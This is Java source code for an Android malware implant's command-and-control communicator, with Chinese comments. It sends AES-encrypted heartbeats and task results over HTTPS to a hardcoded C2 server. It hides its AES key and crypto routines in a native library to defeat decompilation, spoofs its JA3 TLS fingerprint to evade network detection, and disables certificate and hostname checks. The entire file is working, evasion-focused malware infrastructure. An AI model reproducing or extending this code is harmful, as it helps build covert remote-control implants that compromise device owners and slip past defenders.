package com.cc.mumac2;

import android.annotation.SuppressLint;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLSocketFactory;

/**
 * C2通信器 - 处理HTTPS通信与AES加密
 *
 * 加密体系（三层保护）：
 * 1. AES 密钥硬编码在 libnative.so 中，Java 反编译不可见
 * 2. AES 加解密运算在 native 层执行，JNI 桥接调用
 * 3. TLS 层使用 JaaSpoofingSocketFactory 改变 JA3 指纹
 */
@SuppressLint({"GetInstance"})
public class C2Communicator {
    private static final String TAG = "C2Communicator";

    // C2服务器地址（请改为运行 c2_server.py 的机器IP）
    private static final String C2_SERVER_URL = "https://10.236.11.113:8443/heartbeat";

    // 连接超时（毫秒）
    private static final int CONNECT_TIMEOUT = 10000;
    private static final int READ_TIMEOUT = 60000;

    private final SSLSocketFactory sslSocketFactory;
    private final HostnameVerifier hostnameVerifier;

    public C2Communicator() {
        // JA3 伪装 SSLSocketFactory（内部自带信任所有证书）
        this.sslSocketFactory = new JaaSpoofingSocketFactory(null);
        this.hostnameVerifier = (hostname, session) -> true;
        Log.i(TAG, "C2通信器初始化完成（Native AES + JA3伪装）");
    }

    /**
     * AES-128-ECB加密 + Base64编码
     *
     * 调用 libnative.so 执行原生 AES 加密，密钥在 .so 内部不可见
     */
    public static String encryptAES(String plaintext) {
        try {
            byte[] input = plaintext.getBytes(StandardCharsets.UTF_8);
            byte[] encrypted = NativeCryptoBridge.encrypt(input);
            if (encrypted == null) {
                Log.e(TAG, "Native AES加密返回null");
                return null;
            }
            return Base64.getEncoder().encodeToString(encrypted);
        } catch (Exception e) {
            Log.e(TAG, "加密失败", e);
            return null;
        }
    }

    /**
     * Base64解码 + AES-128-ECB解密
     *
     * 调用 libnative.so 执行原生 AES 解密
     */
    public static String decryptAES(String ciphertext) {
        try {
            byte[] input = Base64.getDecoder().decode(ciphertext);
            byte[] decrypted = NativeCryptoBridge.decrypt(input);
            if (decrypted == null) {
                Log.e(TAG, "Native AES解密返回null");
                return null;
            }
            return new String(decrypted, StandardCharsets.UTF_8);
        } catch (Exception e) {
            Log.e(TAG, "解密失败", e);
            return null;
        }
    }

    /**
     * 执行 HTTPS POST 请求，返回响应体字符串
     */
    private String httpPost(String bodyData) {
        if (sslSocketFactory == null) {
            Log.e(TAG, "SSLSocketFactory未初始化");
            return null;
        }
        HttpsURLConnection conn = null;
        try {
            URL url = new URL(C2_SERVER_URL);
            conn = (HttpsURLConnection) url.openConnection();
            conn.setSSLSocketFactory(sslSocketFactory);
            conn.setHostnameVerifier(hostnameVerifier);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "text/plain; charset=utf-8");
            conn.setConnectTimeout(CONNECT_TIMEOUT);
            conn.setReadTimeout(READ_TIMEOUT);
            conn.setDoOutput(true);
            conn.setDoInput(true);

            OutputStream os = conn.getOutputStream();
            byte[] input = bodyData.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpsURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
                return response.toString();
            } else {
                Log.w(TAG, "HTTP响应码: " + responseCode);
            }
        } catch (IOException e) {
            Log.e(TAG, "HTTPS请求失败", e);
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
        return null;
    }

    public String sendHeartbeat(String encryptedData) {
        return httpPost(encryptedData);
    }

    public void sendResult(String encryptedResult) {
        String response = httpPost(encryptedResult);
        if (response != null) {
            Log.i(TAG, "结果已成功回传");
        } else {
            Log.w(TAG, "结果回传失败");
        }
    }
}
